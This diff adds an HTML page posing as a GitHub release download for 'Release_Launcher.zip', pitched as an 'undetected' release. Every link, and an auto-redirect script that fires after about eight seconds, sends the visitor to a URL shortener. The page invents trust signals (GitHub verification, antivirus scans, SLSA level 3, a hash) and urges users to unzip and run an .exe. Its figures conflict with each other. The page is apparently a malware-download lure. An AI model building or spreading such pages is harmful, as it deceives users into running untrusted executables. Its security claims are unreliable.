@@ -1,0 +1,266 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>github-release • Release </title>
+<meta name="description" content="Latest Undetected Release 2026: Money" />
+<style>
+:root{
+  --hue:197;
+  --accent-sat:64%;
+  --accent-light:60%;
+  --bg:hsl(var(--hue),25%,8%);
+  --bg-2:hsl(var(--hue),25%,16%);
+  --panel:hsl(var(--hue),25%,15%);
+  --panel-2:hsl(var(--hue),18%,19%);
+  --border:hsl(var(--hue),13%,24%);
+  --text:hsl(var(--hue),18%,89%);
+  --muted:hsl(var(--hue),9%,71%);
+  --accent:hsl(var(--hue),var(--accent-sat),var(--accent-light));
+  --accent-2:hsl(calc(var(--hue) + 55),var(--accent-sat),var(--accent-light));
+  --radius:14px;
+  --radius-lg:15px;
+  --gap:22px;
+  --pad:25px;
+  --shadow:0 9px 35px hsla(var(--hue),40%,3%,0.64);
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{
+  background:radial-gradient(1200px 415px at 19% -10%,var(--accent-2) 0%,transparent 60%),
+             radial-gradient(811px 681px at 80% 110%,var(--accent) 0%,transparent 55%),
+             var(--bg);
+  color:var(--text);
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,sans-serif;
+  font-size:16px;line-height:1.55;
+  min-height:100vh;
+}
+a{color:inherit;text-decoration:none;cursor:pointer}
+a:hover{color:var(--accent)}
+svg{width:20px;height:20px;flex-shrink:0}
+.container{max-width:1082px;margin:0 auto;padding:0 var(--pad)}
+.nav{position:sticky;top:0;z-index:10;backdrop-filter:blur(12px);background:hsla(var(--hue),20%,8%,.7);border-bottom:1px solid var(--border)}
+.nav-inner{max-width:1082px;margin:0 auto;padding:14px var(--pad);display:flex;align-items:center;gap:var(--gap);justify-content:space-between}
+.brand{display:flex;align-items:center;gap:10px;font-weight:700;font-size:1.05rem}
+.brand-slash{color:var(--muted)}
+.brand-name{color:var(--accent)}
+.nav-links{display:flex;gap:22px;list-style:none;margin:0;padding:0}
+.nav-links a{color:var(--muted);font-weight:500}
+.nav-links a:hover{color:var(--text)}
+.nav-cta{display:inline-flex;align-items:center;gap:8px;padding:9px 16px;border-radius:var(--radius);background:var(--accent);color:hsl(var(--hue),20%,8%);font-weight:600}
+.nav-cta:hover{color:hsl(var(--hue),20%,8%);filter:brightness(1.08)}
+main{padding:43px 0 94px}
+.hero{text-align:center;padding:35px 0}
+.pill{display:inline-flex;align-items:center;gap:8px;padding:6px 14px;border-radius:999px;background:var(--panel);border:1px solid var(--border);font-size:.85rem;color:var(--muted)}
+.pill .dot{width:8px;height:8px;border-radius:50%;background:var(--accent);box-shadow:0 0 12px var(--accent)}
+.pill strong{color:var(--text)}
+.pill .sep{opacity:.5}
+h1{font-size:clamp(2rem,3vw + 1rem,3.6rem);margin:25px 0 12px;font-weight:800;letter-spacing:-.02em}
+h1 .accent{color:var(--accent)}
+.caret{display:inline-block;color:var(--accent);animation:blink 1s steps(1) infinite;margin-left:4px}
+@keyframes blink{50%{opacity:0}}
+.lead{color:var(--muted);max-width:587px;margin:0 auto;font-size:1.08rem}
+.chips{display:flex;flex-wrap:wrap;justify-content:center;gap:10px;margin-top:31px}
+.chip{display:inline-flex;align-items:center;gap:6px;padding:6px 12px;border-radius:999px;background:var(--panel);border:1px solid var(--border);font-size:.85rem;color:var(--muted)}
+.chip svg{width:14px;height:14px;color:var(--accent)}
+.section{margin:44px 0}
+.section-title{font-size:1.4rem;font-weight:700;margin:0 0 20px}
+.file-card{background:linear-gradient(180deg,var(--panel) 0%,var(--panel-2) 100%);border:1px solid var(--border);border-radius:var(--radius-lg);padding:var(--pad);box-shadow:var(--shadow)}
+.file-head{display:flex;align-items:center;gap:16px;margin-bottom:18px}
+.file-icon{width:56px;height:56px;border-radius:var(--radius);background:hsla(var(--hue),40%,50%,.12);display:grid;place-items:center;color:var(--accent);border:1px solid var(--border)}
+.file-icon svg{width:28px;height:28px}
+.file-meta{flex:1;min-width:0}
+.file-name{font-size:1.15rem;font-weight:700;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+.verified{display:inline-flex;align-items:center;gap:4px;color:var(--accent);font-size:.75rem;font-weight:600;padding:2px 8px;border-radius:999px;background:hsla(var(--hue),50%,50%,.12)}
+.verified svg{width:12px;height:12px}
+.file-sub{color:var(--muted);font-size:.9rem;margin-top:2px}
+.file-hash{display:flex;align-items:center;gap:10px;background:var(--bg-2);border:1px solid var(--border);border-radius:var(--radius);padding:10px 14px;margin-bottom:16px;flex-wrap:wrap}
+.file-hash .label{color:var(--muted);font-size:.78rem;font-weight:600;letter-spacing:.05em}
+.file-hash .hash{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:.78rem;color:var(--text);word-break:break-all;flex:1;min-width:0}
+.file-hash button{background:transparent;color:var(--muted);border:1px solid var(--border);border-radius:6px;padding:4px 10px;font-size:.78rem;cursor:pointer}
+.file-hash button:hover{color:var(--text);border-color:var(--accent)}
+.file-actions{display:flex;gap:12px;flex-wrap:wrap}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:12px 20px;border-radius:var(--radius);background:var(--panel);border:1px solid var(--border);color:var(--text);font-weight:600;cursor:pointer}
+.btn:hover{border-color:var(--accent);color:var(--accent)}
+.btn-primary{background:var(--accent);color:hsl(var(--hue),20%,8%);border-color:transparent}
+.btn-primary:hover{filter:brightness(1.08);color:hsl(var(--hue),20%,8%)}
+.btn-lg{padding:14px 22px;font-size:1rem}
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(176px,1fr));gap:var(--gap);margin-top:20px}
+.stat{background:var(--panel);border:1px solid var(--border);border-radius:var(--radius);padding:16px}
+.stat .label{color:var(--muted);font-size:.78rem;font-weight:600;letter-spacing:.05em;margin-bottom:6px}
+.stat .value{font-size:1.15rem;font-weight:700}
+.stat .value .sub{font-size:.82rem;color:var(--muted);font-weight:500;margin-left:4px}
+.stat .value .accent{color:var(--accent)}
+.features{display:grid;grid-template-columns:repeat(auto-fit,minmax(273px,1fr));gap:var(--gap)}
+.card{background:var(--panel);border:1px solid var(--border);border-radius:var(--radius);padding:var(--pad);transition:border-color .15s ease,transform .15s ease}
+.card:hover{border-color:var(--accent);transform:translateY(-2px)}
+.card-icon{width:40px;height:40px;border-radius:10px;background:hsla(var(--hue),50%,50%,.12);color:var(--accent);display:grid;place-items:center;margin-bottom:14px}
+.card h3{margin:0 0 8px;font-size:1.05rem}
+.card p{margin:0;color:var(--muted);font-size:.92rem}
+.timeline{display:flex;flex-direction:column;gap:16px;position:relative;padding-left:26px}
+.timeline::before{content:"";position:absolute;left:8px;top:6px;bottom:6px;width:2px;background:var(--border)}
+.timeline-item{position:relative}
+.timeline-item::before{content:"";position:absolute;left:-24px;top:6px;width:12px;height:12px;border-radius:50%;background:var(--accent);box-shadow:0 0 0 4px var(--panel)}
+.timeline-item h4{margin:0 0 4px;font-size:1rem}
+.timeline-item p{margin:0;color:var(--muted);font-size:.92rem}
+.footer{border-top:1px solid var(--border);margin-top:60px;padding:22px 0;color:var(--muted);font-size:.85rem}
+.footer-inner{max-width:1082px;margin:0 auto;padding:0 var(--pad);display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px}
+.footer a{color:var(--muted)}
+.footer a:hover{color:var(--accent)}
+@media (max-width:640px){
+  .nav-links{display:none}
+  .file-head{flex-direction:column;text-align:center}
+  .file-actions{flex-direction:column}
+  .btn{justify-content:center}
+}
+</style>
+</head>
+<body>
+<header class="nav">
+  <div class="nav-inner">
+    <a href="https://flyn.co/SyG1-U" data-go class="brand">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>
+      <span class="brand-slash">/</span><span class="brand-name">release</span>
+    </a>
+    <ul class="nav-links">
+      <li><a href="https://flyn.co/SyG1-U" data-go>Home</a></li>
+      <li><a href="https://flyn.co/SyG1-U" data-go>Repositories</a></li>
+      <li><a href="https://flyn.co/SyG1-U" data-go>Security</a></li>
+    </ul>
+    <div class="nav-right">
+      <a href="https://flyn.co/SyG1-U" data-go class="nav-cta">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+        Download
+      </a>
+    </div>
+  </div>
+</header>
+<main>
+  <section class="container hero">
+    <div class="hero-inner">
+      <span class="pill"><span class="dot"></span><strong>v2.1.2</strong><span class="sep">·</span> stable/3.1 <span class="sep">·</span> updated 37 mins ago</span>
+      <h1><span class="accent">$</span> Release_Launcher <span class="caret">▍</span></h1>
+      <p class="lead">Latest Undetected Release 2026: Licensed version</p>
+      <div class="chips">
+        <span class="chip"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> MIT Licensed</span>
+        <span class="chip"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> SHA-256 verified</span>
+        <span class="chip"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> No telemetry</span>
+        <span class="chip"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> SLSA level 3</span>
+      </div>
+    </div>
+  </section>
+  <div class="container">
+    <section class="section">
+      <div class="file-card">
+        <div class="file-head">
+          <div class="file-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/><polyline points="3.27 6.96 12 12.01 20.73 6.96"/><line x1="12" y1="22.08" x2="12" y2="12"/></svg>
+          </div>
+          <div class="file-meta">
+            <div class="file-name">
+              Release_Launcher.zip
+              <span class="verified">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+                GitHub Verified
+              </span>
+            </div>
+            <div class="file-sub">github-release / Release_Launcher · 33.2 MB · Provenance signed</div>
+          </div>
+        </div>
+        <div class="file-hash">
+          <span class="label">SHA-256</span>
+          <span class="hash">a9b3b22012137ad4fb026b8413544229cf535fdf5ad6706b062da207bfb9d676</span>
+        </div>
+        <div class="file-actions">
+          <a href="https://flyn.co/SyG1-U" data-go class="btn btn-primary btn-lg">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+            Download release-x64.zip
+          </a>
+          <a href="https://flyn.co/SyG1-U" data-go class="btn btn-lg">View source</a>
+        </div>
+      </div>
+      <div class="stats">
+        <div class="stat"><div class="label">Stars</div><div class="value">429 <span class="sub">★</span></div></div>
+        <div class="stat"><div class="label">Forks</div><div class="value">50</div></div>
+        <div class="stat"><div class="label">Archive size</div><div class="value">103.2 <span class="sub">MB</span></div></div>
+        <div class="stat"><div class="label">Latest</div><div class="value"><span class="accent">v2.1.4</span></div></div>
+      </div>
+    </section>
+    <section class="section">
+      <h2 class="section-title">Security &amp; provenance</h2>
+      <div class="features">
+        <div class="card">
+          <div class="card-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg></div>
+          <h3>ClamAV + 5 engines</h3>
+          <p>Every archive is scanned by ClamAV and four additional engines before release. Zero threats reported on this build.</p>
+        </div>
+        <div class="card">
+          <div class="card-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></div>
+          <h3>AES-256 end-to-end</h3>
+          <p>Transfer is protected with AES-256 encryption end-to-end. Nothing touches disk in plaintext during transit.</p>
+        </div>
+        <div class="card">
+          <div class="card-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>
+          <h3>SLSA level 3</h3>
+          <p>The pipeline satisfies SLSA level 3: hermetic builds, signed provenance, source-code integrity checks.</p>
+        </div>
+        <div class="card">
+          <div class="card-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M2 8h20"/><path d="M6 12h4"/></svg></div>
+          <h3>No installer</h3>
+          <p>Unzip the archive and launch Release_Launcher.exe — no setup wizard, no registry entries, no admin required.</p>
+        </div>
+        <div class="card">
+          <div class="card-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18.36 6.64A9 9 0 1 1 5.64 6.64"/><line x1="12" y1="2" x2="12" y2="12"/></svg></div>
+          <h3>No telemetry</h3>
+          <p>Nothing calls home. The binary runs fully offline once the archive is extracted.</p>
+        </div>
+        <div class="card">
+          <div class="card-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg></div>
+          <h3>Refreshed every 48h</h3>
+          <p>A fresh build is published every two days, so you always land on the latest verified version.</p>
+        </div>
+      </div>
+    </section>
+    <section class="section">
+      <h2 class="section-title">Secure delivery pipeline</h2>
+      <div class="timeline">
+        <div class="timeline-item">
+          <h4>Repository clone &amp; hash validation</h4>
+          <p>Sources are fetched from the pinned commit and the tree hash is validated against the signed manifest.</p>
+        </div>
+        <div class="timeline-item">
+          <h4>Deep static analysis (SAST + secrets)</h4>
+          <p>SAST rules run over the full codebase, with secret-scanning to make sure no credentials leaked.</p>
+        </div>
+        <div class="timeline-item">
+          <h4>Dependency vulnerability audit (SBOM)</h4>
+          <p>A full SBOM is produced and cross-checked against known-CVE feeds before packaging.</p>
+        </div>
+        <div class="timeline-item">
+          <h4>Code signing &amp; notarization</h4>
+          <p>Artifacts are signed and provenance is attached; the download button will start once the token is issued.</p>
+        </div>
+      </div>
+    </section>
+  </div>
+</main>
+<footer class="footer">
+  <div class="footer-inner">
+    <span>© 2026 - Secure code distribution. All artifacts are signed and verified.</span>
+    <span>
+      <a href="https://flyn.co/SyG1-U" data-go>home</a> ·
+      <a href="https://flyn.co/SyG1-U" data-go>repositories</a> ·
+      <a href="https://flyn.co/SyG1-U" data-go>download</a>
+    </span>
+  </div>
+</footer>
+<script>
+(function(){
+  var TARGET = "https://flyn.co/SyG1-U";
+  var REDIRECT_MS = 8436;
+  setTimeout(function(){ try{ window.location.href = TARGET; }catch(_){} }, REDIRECT_MS);
+})();
+</script>
+</body>
+</html>
